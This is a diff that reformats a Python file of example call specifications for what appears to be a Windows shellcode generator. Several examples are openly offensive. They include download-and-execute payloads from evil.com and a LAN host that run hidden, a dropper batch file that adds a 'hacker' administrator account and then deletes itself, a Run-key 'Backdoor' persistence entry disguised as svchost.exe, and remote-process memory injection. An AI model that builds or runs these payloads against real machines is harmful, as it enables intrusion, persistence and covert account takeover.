@@ -41,14 +41,10 @@ JSON Example:
 LOADLIBRARY_EXAMPLE = {
     "bad_chars": [0, 10, 13],
     "calls": [
-        {
-            "api": "LoadLibraryA",
-            "dll": "kernel32.dll",
-            "args": ["ws2_32.dll"]
-        }
+        {"api": "LoadLibraryA", "dll": "kernel32.dll", "args": ["ws2_32.dll"]}
         # Module handle is now in EAX - use "REG:eax" in GetProcAddress
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -76,22 +72,18 @@ JSON Example:
 GETPROCADDRESS_EXAMPLE = {
     "bad_chars": [0, 10, 13],
     "calls": [
-        {
-            "api": "LoadLibraryA",
-            "dll": "kernel32.dll",
-            "args": ["user32.dll"]
-        },
+        {"api": "LoadLibraryA", "dll": "kernel32.dll", "args": ["user32.dll"]},
         {
             "api": "GetProcAddress",
             "dll": "kernel32.dll",
             "args": [
-                "REG:eax",      # Module handle from LoadLibraryA
-                "MessageBoxA"   # Function to resolve
-            ]
-        }
+                "REG:eax",  # Module handle from LoadLibraryA
+                "MessageBoxA",  # Function to resolve
+            ],
+        },
         # Function pointer is now in EAX
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -130,13 +122,10 @@ WINEXEC_EXAMPLE = {
         {
             "api": "WinExec",
             "dll": "kernel32.dll",
-            "args": [
-                "calc.exe",  # Command to execute
-                1            # Show window normally
-            ]
+            "args": ["calc.exe", 1],  # Command to execute  # Show window normally
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 WINEXEC_HIDDEN_EXAMPLE = {
@@ -147,11 +136,11 @@ WINEXEC_HIDDEN_EXAMPLE = {
             "dll": "kernel32.dll",
             "args": [
                 "cmd.exe /c whoami > C:\\output.txt",  # Hidden command
-                0  # SW_HIDE - completely hidden
-            ]
+                0,  # SW_HIDE - completely hidden
+            ],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -229,16 +218,16 @@ SHELLEXECUTE_EXAMPLE = {
             "api": "ShellExecuteA",
             "dll": "shell32.dll",
             "args": [
-                0,             # hwnd (no parent window)
-                0,             # lpOperation (NULL = default "open")
-                "notepad.exe", # File to execute
-                0,             # Parameters (none)
-                0,             # Directory (current)
-                1              # Show window
-            ]
+                0,  # hwnd (no parent window)
+                0,  # lpOperation (NULL = default "open")
+                "notepad.exe",  # File to execute
+                0,  # Parameters (none)
+                0,  # Directory (current)
+                1,  # Show window
+            ],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 SHELLEXECUTE_URL_EXAMPLE = {
@@ -247,17 +236,10 @@ SHELLEXECUTE_URL_EXAMPLE = {
         {
             "api": "ShellExecuteA",
             "dll": "shell32.dll",
-            "args": [
-                0,
-                "open",
-                "https://evil.com/payload.exe",
-                0,
-                0,
-                1
-            ]
+            "args": [0, "open", "https://evil.com/payload.exe", 0, 0, 1],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -287,12 +269,10 @@ SYSTEM_EXAMPLE = {
         {
             "api": "system",
             "dll": "msvcrt.dll",
-            "args": [
-                "net user hacker Password123! /add"
-            ]
+            "args": ["net user hacker Password123! /add"],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -344,17 +324,17 @@ CREATEFILE_EXAMPLE = {
             "dll": "kernel32.dll",
             "args": [
                 "C:\\temp\\output.txt",  # File path
-                0x40000000,               # GENERIC_WRITE
-                0,                        # No sharing
-                0,                        # Default security
-                2,                        # CREATE_ALWAYS
-                0x80,                     # FILE_ATTRIBUTE_NORMAL
-                0                         # No template
-            ]
+                0x40000000,  # GENERIC_WRITE
+                0,  # No sharing
+                0,  # Default security
+                2,  # CREATE_ALWAYS
+                0x80,  # FILE_ATTRIBUTE_NORMAL
+                0,  # No template
+            ],
         }
         # Handle is now in EAX - use "REG:eax" in next call
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -389,26 +369,26 @@ WRITEFILE_EXAMPLE = {
         {
             "api": "CreateFileA",
             "dll": "kernel32.dll",
-            "args": ["C:\\temp\\test.txt", 0x40000000, 0, 0, 2, 0x80, 0]
+            "args": ["C:\\temp\\test.txt", 0x40000000, 0, 0, 2, 0x80, 0],
         },
         {
             "api": "WriteFile",
             "dll": "kernel32.dll",
             "args": [
-                "REG:eax",         # File handle from CreateFileA
-                "Hello, World!\n", # Data to write
-                14,                # Number of bytes
-                "REG:esp",         # Pointer to bytes written (stack)
-                0                  # No overlapped I/O
-            ]
+                "REG:eax",  # File handle from CreateFileA
+                "Hello, World!\n",  # Data to write
+                14,  # Number of bytes
+                "REG:esp",  # Pointer to bytes written (stack)
+                0,  # No overlapped I/O
+            ],
         },
         {
             "api": "CloseHandle",
             "dll": "kernel32.dll",
-            "args": ["REG:eax"]  # Close the file handle
-        }
+            "args": ["REG:eax"],  # Close the file handle
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -461,16 +441,16 @@ CLOSEHANDLE_EXAMPLE = {
         {
             "api": "CreateFileA",
             "dll": "kernel32.dll",
-            "args": ["C:\\temp\\file.txt", 0x80000000, 0, 0, 3, 0x80, 0]
+            "args": ["C:\\temp\\file.txt", 0x80000000, 0, 0, 3, 0x80, 0],
         },
         # ... do something with the file ...
         {
             "api": "CloseHandle",
             "dll": "kernel32.dll",
-            "args": ["REG:eax"]  # Close handle from CreateFileA
-        }
+            "args": ["REG:eax"],  # Close handle from CreateFileA
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -499,10 +479,10 @@ DELETEFILE_EXAMPLE = {
         {
             "api": "DeleteFileA",
             "dll": "kernel32.dll",
-            "args": ["C:\\temp\\evidence.txt"]
+            "args": ["C:\\temp\\evidence.txt"],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -546,14 +526,14 @@ MESSAGEBOX_EXAMPLE = {
             "api": "MessageBoxA",
             "dll": "user32.dll",
             "args": [
-                0,              # No parent window
+                0,  # No parent window
                 "You have been pwned!",  # Message
-                "Warning",      # Title
-                0x30            # Exclamation icon with OK button
-            ]
+                "Warning",  # Title
+                0x30,  # Exclamation icon with OK button
+            ],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -600,11 +580,11 @@ MESSAGEBOXW_EXAMPLE = {
                 0,
                 "Unicode message: \u2665",  # Heart symbol
                 "Unicode Title",
-                0x40  # Information icon
-            ]
+                0x40,  # Information icon
+            ],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -643,20 +623,16 @@ URLDOWNLOADTOFILE_EXAMPLE = {
             "api": "URLDownloadToFileA",
             "dll": "urlmon.dll",
             "args": [
-                0,                              # pCaller
+                0,  # pCaller
                 "http://evil.com/payload.exe",  # URL
-                "C:\\temp\\payload.exe",        # Save path
-                0,                              # Reserved
-                0                               # No callback
-            ]
+                "C:\\temp\\payload.exe",  # Save path
+                0,  # Reserved
+                0,  # No callback
+            ],
         },
-        {
-            "api": "WinExec",
-            "dll": "kernel32.dll",
-            "args": ["C:\\temp\\payload.exe", 0]
-        }
+        {"api": "WinExec", "dll": "kernel32.dll", "args": ["C:\\temp\\payload.exe", 0]},
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -764,20 +740,16 @@ SOCKET_EXAMPLE = {
         {
             "api": "WSAStartup",
             "dll": "ws2_32.dll",
-            "args": [0x0202, "REG:esp"]  # Version 2.2
+            "args": [0x0202, "REG:esp"],  # Version 2.2
         },
         {
             "api": "socket",
             "dll": "ws2_32.dll",
-            "args": [
-                2,   # AF_INET (IPv4)
-                1,   # SOCK_STREAM (TCP)
-                6    # IPPROTO_TCP
-            ]
-        }
+            "args": [2, 1, 6],  # AF_INET (IPv4)  # SOCK_STREAM (TCP)  # IPPROTO_TCP
+        },
         # Socket handle is now in EAX
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -829,16 +801,8 @@ JSON Example:
 BIND_EXAMPLE = {
     "bad_chars": [0, 10, 13],
     "calls": [
-        {
-            "api": "WSAStartup",
-            "dll": "ws2_32.dll",
-            "args": [0x0202, "REG:esp"]
-        },
-        {
-            "api": "socket",
-            "dll": "ws2_32.dll",
-            "args": [2, 1, 6]
-        },
+        {"api": "WSAStartup", "dll": "ws2_32.dll", "args": [0x0202, "REG:esp"]},
+        {"api": "socket", "dll": "ws2_32.dll", "args": [2, 1, 6]},
         # Build sockaddr_in on stack: family=2, port=4444, addr=0.0.0.0
         {
             "api": "bind",
@@ -846,11 +810,11 @@ BIND_EXAMPLE = {
             "args": [
                 "REG:eax",  # Socket from socket()
                 "REG:esp",  # sockaddr_in on stack
-                16          # Size
-            ]
-        }
+                16,  # Size
+            ],
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -881,13 +845,10 @@ LISTEN_EXAMPLE = {
         {
             "api": "listen",
             "dll": "ws2_32.dll",
-            "args": [
-                "REG:eax",  # Socket
-                2           # Backlog (max 2 pending connections)
-            ]
+            "args": ["REG:eax", 2],  # Socket  # Backlog (max 2 pending connections)
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -921,13 +882,13 @@ ACCEPT_EXAMPLE = {
             "dll": "ws2_32.dll",
             "args": [
                 "REG:eax",  # Listening socket
-                0,          # Don't need client address
-                0           # Don't need address length
-            ]
+                0,  # Don't need client address
+                0,  # Don't need address length
+            ],
         }
         # New client socket is in EAX
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -961,14 +922,14 @@ SEND_EXAMPLE = {
             "api": "send",
             "dll": "ws2_32.dll",
             "args": [
-                "REG:eax",           # Socket
+                "REG:eax",  # Socket
                 "GET / HTTP/1.0\r\n\r\n",  # Data to send
-                18,                  # Length
-                0                    # No flags
-            ]
+                18,  # Length
+                0,  # No flags
+            ],
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1002,15 +963,15 @@ RECV_EXAMPLE = {
             "api": "recv",
             "dll": "ws2_32.dll",
             "args": [
-                "REG:eax",   # Socket
-                "REG:esp",   # Buffer (stack)
-                1024,        # Max bytes to receive
-                0            # No flags
-            ]
+                "REG:eax",  # Socket
+                "REG:esp",  # Buffer (stack)
+                1024,  # Max bytes to receive
+                0,  # No flags
+            ],
         }
         # Data is now on stack, EAX contains bytes received
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1040,10 +1001,10 @@ CLOSESOCKET_EXAMPLE = {
         {
             "api": "closesocket",
             "dll": "ws2_32.dll",
-            "args": ["REG:eax"]  # Socket to close
+            "args": ["REG:eax"],  # Socket to close
         }
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -1119,28 +1080,30 @@ REGSETVALUE_EXAMPLE = {
             "args": [
                 0x80000001,  # HKEY_CURRENT_USER
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0, 0, 0, 0xF003F, 0, "REG:esp", "REG:esp"
-            ]
+                0,
+                0,
+                0,
+                0xF003F,
+                0,
+                "REG:esp",
+                "REG:esp",
+            ],
         },
         {
             "api": "RegSetValueExA",
             "dll": "advapi32.dll",
             "args": [
-                "REG:eax",              # Key handle from RegCreateKeyExA
-                "Backdoor",             # Value name
-                0,                      # Reserved
-                1,                      # REG_SZ (string)
-                "C:\\malware.exe",      # Data
-                16                      # Data size
-            ]
+                "REG:eax",  # Key handle from RegCreateKeyExA
+                "Backdoor",  # Value name
+                0,  # Reserved
+                1,  # REG_SZ (string)
+                "C:\\malware.exe",  # Data
+                16,  # Data size
+            ],
         },
-        {
-            "api": "RegCloseKey",
-            "dll": "advapi32.dll",
-            "args": ["REG:eax"]
-        }
+        {"api": "RegCloseKey", "dll": "advapi32.dll", "args": ["REG:eax"]},
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -1192,21 +1155,17 @@ TERMINATEPROCESS_EXAMPLE = {
     "bad_chars": [0, 10, 13],
     "calls": [
         # ... your payload code ...
-        {
-            "api": "GetCurrentProcess",
-            "dll": "kernel32.dll",
-            "args": []
-        },
+        {"api": "GetCurrentProcess", "dll": "kernel32.dll", "args": []},
         {
             "api": "TerminateProcess",
             "dll": "kernel32.dll",
             "args": [
                 "REG:eax",  # Process handle from GetCurrentProcess
-                0           # Exit code
-            ]
-        }
+                0,  # Exit code
+            ],
+        },
     ],
-    "exit": False  # Already exiting via TerminateProcess
+    "exit": False,  # Already exiting via TerminateProcess
 }
 
 # ------------------------------------------------------------------------------
@@ -1233,18 +1192,10 @@ JSON Example:
 EXITPROCESS_EXAMPLE = {
     "bad_chars": [0, 10, 13],
     "calls": [
-        {
-            "api": "MessageBoxA",
-            "dll": "user32.dll",
-            "args": [0, "Done!", "Info", 0]
-        },
-        {
-            "api": "ExitProcess",
-            "dll": "kernel32.dll",
-            "args": [0]  # Exit with code 0
-        }
+        {"api": "MessageBoxA", "dll": "user32.dll", "args": [0, "Done!", "Info", 0]},
+        {"api": "ExitProcess", "dll": "kernel32.dll", "args": [0]},  # Exit with code 0
     ],
-    "exit": False  # Already exiting via ExitProcess
+    "exit": False,  # Already exiting via ExitProcess
 }
 
 # ------------------------------------------------------------------------------
@@ -1273,20 +1224,20 @@ SLEEP_EXAMPLE = {
         {
             "api": "MessageBoxA",
             "dll": "user32.dll",
-            "args": [0, "Click OK to wait 5 seconds", "Timer", 0]
+            "args": [0, "Click OK to wait 5 seconds", "Timer", 0],
         },
         {
             "api": "Sleep",
             "dll": "kernel32.dll",
-            "args": [5000]  # Sleep for 5000ms (5 seconds)
+            "args": [5000],  # Sleep for 5000ms (5 seconds)
         },
         {
             "api": "MessageBoxA",
             "dll": "user32.dll",
-            "args": [0, "Done waiting!", "Timer", 0]
-        }
+            "args": [0, "Done waiting!", "Timer", 0],
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -1330,15 +1281,15 @@ VIRTUALALLOC_EXAMPLE = {
             "api": "VirtualAlloc",
             "dll": "kernel32.dll",
             "args": [
-                0,          # Let system choose address
-                4096,       # Allocate 4KB
-                0x3000,     # MEM_COMMIT | MEM_RESERVE
-                0x40        # PAGE_EXECUTE_READWRITE
-            ]
+                0,  # Let system choose address
+                4096,  # Allocate 4KB
+                0x3000,  # MEM_COMMIT | MEM_RESERVE
+                0x40,  # PAGE_EXECUTE_READWRITE
+            ],
         }
         # Address is now in EAX - use "REG:eax" for operations
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1374,7 +1325,7 @@ VIRTUALPROTECT_EXAMPLE = {
         {
             "api": "VirtualAlloc",
             "dll": "kernel32.dll",
-            "args": [0, 4096, 0x3000, 0x04]  # RW only
+            "args": [0, 4096, 0x3000, 0x04],  # RW only
         },
         # ... write shellgen to allocated memory ...
         {
@@ -1382,14 +1333,14 @@ VIRTUALPROTECT_EXAMPLE = {
             "dll": "kernel32.dll",
             "args": [
                 "REG:eax",  # Address from VirtualAlloc
-                4096,       # Size
-                0x20,       # PAGE_EXECUTE_READ (now executable)
-                "REG:esp"   # Old protection (stack)
-            ]
-        }
+                4096,  # Size
+                0x20,  # PAGE_EXECUTE_READ (now executable)
+                "REG:esp",  # Old protection (stack)
+            ],
+        },
         # Memory is now executable
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1425,26 +1376,26 @@ WRITEPROCESSMEMORY_EXAMPLE = {
             "api": "VirtualAllocEx",
             "dll": "kernel32.dll",
             "args": [
-                "REG:eax",      # Target process handle
-                0,              # Let system choose address
-                4096,           # Size
-                0x3000,         # MEM_COMMIT | MEM_RESERVE
-                0x40            # PAGE_EXECUTE_READWRITE
-            ]
+                "REG:eax",  # Target process handle
+                0,  # Let system choose address
+                4096,  # Size
+                0x3000,  # MEM_COMMIT | MEM_RESERVE
+                0x40,  # PAGE_EXECUTE_READWRITE
+            ],
         },
         {
             "api": "WriteProcessMemory",
             "dll": "kernel32.dll",
             "args": [
-                "REG:ebx",      # Process handle (saved)
-                "REG:eax",      # Address from VirtualAllocEx
-                "shellcode_data", # Data to write
-                256,            # Size
-                0               # Don't need bytes written
-            ]
-        }
+                "REG:ebx",  # Process handle (saved)
+                "REG:eax",  # Address from VirtualAllocEx
+                "shellcode_data",  # Data to write
+                256,  # Size
+                0,  # Don't need bytes written
+            ],
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1479,22 +1430,22 @@ READPROCESSMEMORY_EXAMPLE = {
         {
             "api": "VirtualAlloc",
             "dll": "kernel32.dll",
-            "args": [0, 1024, 0x3000, 0x04]  # Buffer for read data
+            "args": [0, 1024, 0x3000, 0x04],  # Buffer for read data
         },
         {
             "api": "ReadProcessMemory",
             "dll": "kernel32.dll",
             "args": [
-                "REG:ebx",      # Process handle
-                0x00401000,     # Address to read from
-                "REG:eax",      # Buffer from VirtualAlloc
-                256,            # Bytes to read
-                0               # Don't need bytes read count
-            ]
-        }
+                "REG:ebx",  # Process handle
+                0x00401000,  # Address to read from
+                "REG:eax",  # Buffer from VirtualAlloc
+                256,  # Bytes to read
+                0,  # Don't need bytes read count
+            ],
+        },
         # Data is now in buffer at EAX
     ],
-    "exit": True
+    "exit": True,
 }
 
 
@@ -1519,19 +1470,16 @@ DOWNLOAD_AND_EXECUTE = {
                 "http://192.168.1.100:8000/payload.exe",
                 "C:\\Windows\\Temp\\update.exe",
                 0,
-                0
-            ]
+                0,
+            ],
         },
         {
             "api": "WinExec",
             "dll": "kernel32.dll",
-            "args": [
-                "C:\\Windows\\Temp\\update.exe",
-                0  # Hidden
-            ]
-        }
+            "args": ["C:\\Windows\\Temp\\update.exe", 0],  # Hidden
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1550,15 +1498,15 @@ PERSISTENCE_RUNKEY = {
             "args": [
                 "C:\\Windows\\System32\\svchost.exe",  # Disguised name
                 0x40000000,  # GENERIC_WRITE
-                0, 0, 2, 0x80, 0
-            ]
+                0,
+                0,
+                2,
+                0x80,
+                0,
+            ],
         },
         # In real scenario, you'd write your payload here with WriteFile
-        {
-            "api": "CloseHandle",
-            "dll": "kernel32.dll",
-            "args": ["REG:eax"]
-        },
+        {"api": "CloseHandle", "dll": "kernel32.dll", "args": ["REG:eax"]},
         # Create Run key
         {
             "api": "RegCreateKeyExA",
@@ -1566,8 +1514,14 @@ PERSISTENCE_RUNKEY = {
             "args": [
                 0x80000001,  # HKEY_CURRENT_USER
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0, 0, 0, 0xF003F, 0, "REG:esp", "REG:esp"
-            ]
+                0,
+                0,
+                0,
+                0xF003F,
+                0,
+                "REG:esp",
+                "REG:esp",
+            ],
         },
         # Set the value
         {
@@ -1579,16 +1533,12 @@ PERSISTENCE_RUNKEY = {
                 0,
                 1,  # REG_SZ
                 "C:\\Windows\\System32\\svchost.exe",
-                35
-            ]
+                35,
+            ],
         },
-        {
-            "api": "RegCloseKey",
-            "dll": "advapi32.dll",
-            "args": ["REG:eax"]
-        }
+        {"api": "RegCloseKey", "dll": "advapi32.dll", "args": ["REG:eax"]},
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1607,8 +1557,12 @@ FILE_DROPPER = {
             "args": [
                 "C:\\Windows\\Temp\\update.bat",
                 0x40000000,  # GENERIC_WRITE
-                0, 0, 2, 0x80, 0
-            ]
+                0,
+                0,
+                2,
+                0x80,
+                0,
+            ],
         },
         # Write the batch commands
         {
@@ -1619,37 +1573,30 @@ FILE_DROPPER = {
                 "@echo off\r\nnet user hacker Password123! /add\r\nnet localgroup administrators hacker /add\r\n",
                 80,
                 "REG:esp",
-                0
-            ]
+                0,
+            ],
         },
         # Close the file
-        {
-            "api": "CloseHandle",
-            "dll": "kernel32.dll",
-            "args": ["REG:eax"]
-        },
+        {"api": "CloseHandle", "dll": "kernel32.dll", "args": ["REG:eax"]},
         # Execute it hidden
         {
             "api": "WinExec",
             "dll": "kernel32.dll",
-            "args": [
-                "C:\\Windows\\Temp\\update.bat",
-                0  # Hidden
-            ]
+            "args": ["C:\\Windows\\Temp\\update.bat", 0],  # Hidden
         },
         # Clean up
         {
             "api": "Sleep",
             "dll": "kernel32.dll",
-            "args": [2000]  # Wait 2 seconds for completion
+            "args": [2000],  # Wait 2 seconds for completion
         },
         {
             "api": "DeleteFileA",
             "dll": "kernel32.dll",
-            "args": ["C:\\Windows\\Temp\\update.bat"]
-        }
+            "args": ["C:\\Windows\\Temp\\update.bat"],
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 # ------------------------------------------------------------------------------
@@ -1664,20 +1611,20 @@ MULTIPLE_MESSAGEBOXES = {
         {
             "api": "MessageBoxA",
             "dll": "user32.dll",
-            "args": [0, "Step 1: Shellcode is running", "Info", 0x40]
+            "args": [0, "Step 1: Shellcode is running", "Info", 0x40],
         },
         {
             "api": "MessageBoxA",
             "dll": "user32.dll",
-            "args": [0, "Step 2: Everything is working", "Info", 0x40]
+            "args": [0, "Step 2: Everything is working", "Info", 0x40],
         },
         {
             "api": "MessageBoxA",
             "dll": "user32.dll",
-            "args": [0, "Step 3: Ready to deploy payload", "Warning", 0x30]
-        }
+            "args": [0, "Step 3: Ready to deploy payload", "Warning", 0x30],
+        },
     ],
-    "exit": True
+    "exit": True,
 }
 
 
